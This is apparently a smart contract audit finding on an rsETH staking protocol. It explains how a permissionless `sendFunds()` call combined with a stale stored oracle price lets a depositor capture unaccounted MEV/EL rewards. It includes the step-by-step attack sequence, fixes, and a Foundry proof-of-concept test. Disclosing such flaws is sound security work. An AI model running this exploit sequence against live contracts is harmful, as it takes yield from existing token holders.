Audit Report

## Title
Permissionless `sendFunds()` Enables Front-Running of Oracle Update to Steal Unclaimed MEV/EL Yield from Existing rsETH Holders — (`contracts/FeeReceiver.sol`)

## Summary
`FeeReceiver.sendFunds()` has no access control, allowing any caller to flush accumulated MEV/EL rewards into `LRTDepositPool` at will. Because `LRTDepositPool.depositETH()` prices rsETH using the stale stored `rsETHPrice` (not the live TVL), a caller who triggers `sendFunds()` immediately before depositing receives rsETH priced against the pre-reward TVL, capturing a portion of the unaccounted rewards at the expense of existing holders.

## Finding Description
`FeeReceiver.sendFunds()` is declared `external` with no role modifier, making it callable by any EOA or contract. [1](#0-0) 

It transfers the full ETH balance to `LRTDepositPool` via `receiveFromRewardReceiver()`, a bare `payable` function with no logic, immediately increasing `address(this).balance` of the deposit pool. [2](#0-1) 

`getETHDistributionData()` reads the live balance directly, so the reward is immediately reflected in TVL calculations used by `_getTotalEthInProtocol()`. [3](#0-2) 

However, `getRsETHAmountToMint()` divides by `lrtOracle.rsETHPrice()`, which is a **stored state variable** updated only when `updateRSETHPrice()` is explicitly called — not on deposit. [4](#0-3) [5](#0-4) 

The exploit sequence:
1. Attacker calls `feeReceiver.sendFunds()` — rewards `R` move into the deposit pool; `rsETHPrice` remains stale at `T/S`.
2. Attacker calls `depositPool.depositETH{value: D}()` — rsETH minted = `D * S / T` (priced at pre-reward rate).
3. Anyone calls `lrtOracle.updateRSETHPrice()` — new price = `(T+R+D) / (S + D*S/T)`.
4. Attacker's rsETH is now worth `D + D*R/(T+D)` ETH — more than `D` deposited.

The `pricePercentageLimit` guard lives entirely inside `_updateRsETHPrice()` and fires only during the oracle update, not during `depositETH()`, so it cannot prevent the yield capture. [6](#0-5) 

## Impact Explanation
**High — Theft of unclaimed yield.** Existing rsETH holders lose a fraction of accrued MEV/EL rewards equal to `D*R/(T+D)` per attack. The protocol remains solvent; no funds are frozen. The impact is yield redistribution from existing holders to the attacker-depositor, which exactly matches the allowed High impact class "Theft of unclaimed yield."

## Likelihood Explanation
- `sendFunds()` is callable by any EOA with zero preconditions.
- `FeeReceiver` accumulates rewards continuously between oracle update cycles, so `R > 0` is the normal operating state.
- The attack requires only two sequential transactions (or a single contract call) and no privileged access, governance capture, or external oracle manipulation.
- It is repeatable every oracle update cycle.
- Likelihood is **High**.

## Recommendation
1. **Add access control to `sendFunds()`** — restrict it to `MANAGER` or `OPERATOR_ROLE` so only authorized parties can flush rewards.
2. Alternatively, **call `updateRSETHPrice()` atomically inside `receiveFromRewardReceiver()`** so the stored price is always current before any subsequent deposit can use it.
3. As defense-in-depth, add an oracle freshness check in `_beforeDeposit()` that reverts if `rsETHPrice` was last updated more than N blocks/seconds ago.

## Proof of Concept
```solidity
// Foundry fork test
// State: FeeReceiver holds R = 10 ETH, Protocol TVL T = 1000 ETH,
//        rsETH supply S = 1000e18 (rsETHPrice = 1e18)

function testYieldTheft() external {
    uint256 R = 10 ether;
    uint256 D = 1 ether;

    // Step 1: flush rewards into DepositPool (permissionless)
    feeReceiver.sendFunds();
    // DepositPool.balance = 1010 ETH, rsETHPrice still = 1e18

    // Step 2: deposit 1 ETH at stale price
    uint256 rsethBefore = rsETH.balanceOf(attacker);
    depositPool.depositETH{value: D}(0, "");
    uint256 rsethMinted = rsETH.balanceOf(attacker) - rsethBefore;
    // rsethMinted = 1e18 (1 ETH / 1e18 = 1 rsETH, priced at pre-reward rate)

    // Step 3: oracle update (callable by anyone)
    lrtOracle.updateRSETHPrice();
    // newPrice = (1010 + 1) / (1000 + 1) ≈ 1.00999e18

    // Attacker's rsETH value > D deposited
    uint256 attackerValue = rsethMinted * lrtOracle.rsETHPrice() / 1e18;
    // ≈ 1.00999 ETH > 1 ETH deposited

    // Existing holders: expected price without attack = 1010/1000 = 1.01e18
    // Actual price after attack ≈ 1.00999e18 — diluted by attacker

    assertGt(attackerValue, D, "attacker captured yield");
}
```
